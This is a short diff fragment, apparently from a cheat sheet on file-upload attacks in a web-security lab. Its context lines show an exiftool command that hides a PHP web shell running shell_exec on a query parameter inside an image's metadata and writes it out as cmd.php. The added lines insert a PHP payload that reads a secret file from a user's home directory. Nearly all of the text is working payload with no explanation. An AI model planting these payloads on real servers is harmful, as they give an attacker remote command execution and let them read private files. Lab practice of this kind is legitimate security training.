@@ -38,6 +38,12 @@ GIF8;
 ?>
 // add php code in image metadata 
 exiftool foto.jpg -Comment='<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>' -o cmd.php
+
+
+
+
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+
 ```
 
 
